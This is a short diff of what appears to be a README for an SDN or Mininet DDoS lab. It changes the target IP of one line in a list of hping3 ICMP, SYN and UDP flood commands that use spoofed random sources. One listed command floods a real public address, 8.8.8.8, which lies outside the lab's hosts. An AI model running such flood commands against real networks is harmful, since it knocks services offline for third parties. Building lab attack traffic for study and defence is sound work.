@@ -96,7 +96,7 @@ Attack DDOS
 Icmp flood command: h6 hping3 -1 -V -d 120 -w 64 -p 80 --rand-source --flood h1
 SYN flood command: 	h6 hping3 -S -V -d 120 -w 64 -p 80 --rand-source --flood h1
 Udp flood command:  h6 hping3 -2 -V -d 120 -w 64 -p 80 --rand-source --flood h1
-attack Controller:  h6 hping3 -1 -V -d 120 -w 64 -p 80 --rand-source --flood 10.0.0.104
+attack Controller:  h6 hping3 -1 -V -d 120 -w 64 -p 80 --rand-source --flood 192.168.0.104
 attack Public	 :  h6 hping3 -1 -V -d 120 -w 64 -p 80 --rand-source --flood 8.8.8.8
 ```
 Other tool attack: I use some cehv11 ddos attack tools
